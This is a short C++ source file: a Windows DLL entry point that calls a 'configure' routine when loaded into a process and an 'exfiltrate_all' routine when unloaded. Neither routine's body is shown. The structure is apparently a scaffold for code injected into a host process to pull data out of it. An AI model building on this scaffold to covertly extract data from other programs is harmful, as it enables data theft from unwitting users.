#include <cstdio>
#include <windows.h>

namespace tyrecon {
void configure();
void exfiltrate_all();
} // namespace tyrecon

BOOL WINAPI DllMain(HINSTANCE hInstDll, DWORD dwReason, LPVOID lpReserved) {
  if (dwReason == DLL_PROCESS_ATTACH) {
    // Dispatch to init function
    // MessageBoxA(0, "Hi", "hi", 0);
    tyrecon::configure();
  }

  if (dwReason == DLL_PROCESS_DETACH) {
    tyrecon::exfiltrate_all();
  }
  return TRUE;
}